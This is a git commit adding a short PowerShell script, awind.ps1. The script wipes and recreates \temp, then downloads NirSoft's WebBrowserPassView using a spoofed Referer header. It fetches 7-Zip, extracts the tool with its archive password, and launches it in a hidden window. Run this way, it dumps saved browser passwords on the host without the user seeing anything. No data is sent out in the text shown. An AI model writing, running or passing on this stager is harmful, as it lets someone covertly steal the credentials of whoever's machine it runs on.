2cf4f02f9528072d6e3b14f0207c39c41d35ea30
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-17 02:39:08 +0100

    Create awind.ps1

---
+++ awind.ps1
@@ -0,0 +1,9 @@
+rm -r \temp
+mkdir \temp
+cd \temp
+Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+Expand-Archive 7z.zip
+.\7z\7za.exe e -p'wbpv28821@' wbpv.zip
+Start-Sleep -Seconds 5
+Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
